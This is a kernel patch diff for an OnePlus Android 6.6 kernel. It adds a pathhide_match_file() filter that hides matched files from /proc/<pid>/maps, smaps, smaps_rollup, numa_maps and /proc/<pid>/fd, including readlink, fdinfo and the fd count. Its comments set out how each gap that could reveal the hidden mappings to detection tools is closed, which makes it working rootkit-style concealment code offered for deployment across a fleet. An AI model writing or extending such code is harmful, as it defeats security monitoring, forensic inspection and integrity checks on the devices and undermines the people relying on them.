@@ -1,44 +1,172 @@
+Hide pathhide-matched files from /proc/<pid>/maps, smaps, smaps_rollup,
+numa_maps and /proc/<pid>/fd (readdir, lookup, readlink and fdinfo).
+
+Generated hunk by hunk against the real tree the fleet pins for this kernel
+version:
+
+    OnePlusOSS/android_kernel_common_oneplus_sm8750 @ oneplus/sm8750_b_16.0.0_oneplus_13
+
+and dry-run at fuzz 0 against every distinct fs/proc variant the manifests
+resolve to. A hunk that only lands "with fuzz" can silently guard the wrong
+function, so treat a fuzz report from `patch` as a failure and regenerate.
+
+Version notes:
+  * proc_readfd_count() exists here and reports the TRUE fd count via
+    bitmap_weight() on the fdtable, bypassing the readdir filter exactly, so
+    stat(/proc/<pid>/fd).st_size leaks the number of hidden fds. It is rewritten
+    to count what readdir emits. 6.6 has task_lookup_next_fd_rcu() (no
+    reference taken), not 6.12's task_lookup_next_fdget_rcu().
+  * show_map()/show_smap() take @v as the VMA directly on every 6.6 tree in the
+    fleet -- no pad copies to free -- so the guard sits inline exactly as it
+    does on 6.12.
+  * smaps_rollup is a do/while here, so `continue` reaches the advance.
+--- a/fs/proc/fd.c
++++ b/fs/proc/fd.c
+@@ -117,9 +117,16 @@
+ static bool tid_fd_mode(struct task_struct *task, unsigned fd, fmode_t *mode)
+ {
+ 	struct file *file;
++	extern bool pathhide_match_file(struct file *f);
+ 
+ 	rcu_read_lock();
+ 	file = task_lookup_fd_rcu(task, fd);
++	/* Hide matched fds from lookup, readlink and fdinfo, and from
++	 * d_revalidate so a cached dentry re-checks and vanishes too.
++	 * Filtering proc_readfd_common() alone leaves readlink(/proc/pid/fd/N)
++	 * returning the hidden path verbatim and fdinfo/N still openable. */
++	if (file && pathhide_match_file(file))
++		file = NULL;
+ 	if (file)
+ 		*mode = file->f_mode;
+ 	rcu_read_unlock();
+@@ -184,9 +191,13 @@
+ 
+ 		fd_file = fget_task(task, fd);
+ 		if (fd_file) {
+-			*path = fd_file->f_path;
+-			path_get(&fd_file->f_path);
+-			ret = 0;
++			extern bool pathhide_match_file(struct file *f);
++
++			if (!pathhide_match_file(fd_file)) {
++				*path = fd_file->f_path;
++				path_get(&fd_file->f_path);
++				ret = 0;
++			}
+ 			fput(fd_file);
+ 		}
+ 		put_task_struct(task);
+@@ -251,6 +262,7 @@
+ {
+ 	struct task_struct *p = get_proc_task(file_inode(file));
+ 	unsigned int fd;
++	extern bool pathhide_match_file(struct file *f);
+ 
+ 	if (!p)
+ 		return -ENOENT;
+@@ -269,6 +281,8 @@
+ 		ctx->pos = fd + 2LL;
+ 		if (!f)
+ 			break;
++		if (pathhide_match_file(f))
++			continue;
+ 		data.mode = f->f_mode;
+ 		rcu_read_unlock();
+ 		data.fd = fd;
+@@ -290,21 +304,29 @@
+ static int proc_readfd_count(struct inode *inode, loff_t *count)
+ {
+ 	struct task_struct *p = get_proc_task(inode);
+-	struct fdtable *fdt;
++	extern bool pathhide_match_file(struct file *f);
++	unsigned int fd = 0;
++	loff_t n = 0;
+ 
+ 	if (!p)
+ 		return -ENOENT;
+ 
+-	task_lock(p);
+-	if (p->files) {
+-		rcu_read_lock();
++	/* Count fds directly, skipping matched ones, so stat(/proc/pid/fd)
++	 * st_size equals the number of entries readdir actually emits. The
++	 * bitmap_weight() this replaces reports the TRUE fd count and so
++	 * bypasses the readdir filter exactly: the delta was measured on
++	 * device to be precisely the number of hidden fds. */
++	rcu_read_lock();
++	for (;; fd++) {
++		struct file *f = task_lookup_next_fd_rcu(p, &fd);
+ 
+-		fdt = files_fdtable(p->files);
+-		*count = bitmap_weight(fdt->open_fds, fdt->max_fds);
+-
+-		rcu_read_unlock();
++		if (!f)
++			break;
++		if (!pathhide_match_file(f))
++			n++;
+ 	}
+-	task_unlock(p);
++	rcu_read_unlock();
++	*count = n;
+ 
+ 	put_task_struct(p);
+ 
 --- a/fs/proc/task_mmu.c
 +++ b/fs/proc/task_mmu.c
-@@ -401,6 +401,10 @@
- 	unsigned long start, end;
- 	dev_t dev = 0;
- 	const char *name = NULL;
-+	extern bool pathhide_match_file(struct file *file);
+@@ -346,6 +346,14 @@
+ static int show_map(struct seq_file *m, void *v)
+ {
+ 	struct vm_area_struct *vma = v;
++	extern bool pathhide_match_file(struct file *f);
 +
-+	if (file && pathhide_match_file(file))
-+		return;
++	/* One decision point for the main line and the pad VMA: the pad is
++	 * synthesized anonymous (vm_file == NULL), so a guard inside
++	 * show_map_vma() would miss it and leave an orphan [page size compat]
++	 * line that smaps drops -- a maps-vs-smaps mismatch. */
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 0;
  
- 	if (file) {
- 		struct inode *inode = file_inode(vma->vm_file);
-@@ -1039,6 +1043,10 @@
+ 	if (vma_pages(vma))
+ 		show_map_vma(m, vma);
+@@ -891,6 +899,10 @@
  {
  	struct vm_area_struct *vma = v;
  	struct mem_size_stats mss;
-+	extern bool pathhide_match_file(struct file *file);
++	extern bool pathhide_match_file(struct file *f);
 +
 +	if (vma->vm_file && pathhide_match_file(vma->vm_file))
 +		return 0;
  
  	memset(&mss, 0, sizeof(mss));
  
-
---- a/fs/proc/fd.c
-+++ b/fs/proc/fd.c
-@@ -251,6 +251,7 @@
- {
- 	struct task_struct *p = get_proc_task(file_inode(file));
- 	unsigned int fd;
-+	extern bool pathhide_match_file(struct file *file);
+@@ -955,6 +967,13 @@
  
- 	if (!p)
- 		return -ENOENT;
-@@ -270,6 +271,8 @@
- 		if (!f)
- 			break;
- 		data.mode = f->f_mode;
-+		if (pathhide_match_file(f))
+ 	vma_start = vma->vm_start;
+ 	do {
++		extern bool pathhide_match_file(struct file *f);
++
++		/* smaps_rollup accumulates on its own and never
++		 * consulted pathhide, so sum(smaps Rss) != rollup Rss
++		 * for a hidden mapping -- a zero-privilege oracle. */
++		if (vma->vm_file && pathhide_match_file(vma->vm_file))
 +			continue;
- 		rcu_read_unlock();
- 		data.fd = fd;
+ 		smap_gather_stats(vma, &mss, 0);
+ 		last_vma_end = vma->vm_end;
+ 
+@@ -2083,6 +2102,15 @@
+ 	if (!mm)
+ 		return 0;
+ 
++	{
++		/* numa_maps prints the backing path too; without this a
++		 * mapping hidden from maps is still named here. */
++		extern bool pathhide_match_file(struct file *f);
++
++		if (file && pathhide_match_file(file))
++			return 0;
++	}
++
+ 	/* Ensure we start with an empty set of numa_maps statistics. */
+ 	memset(md, 0, sizeof(*md));
  
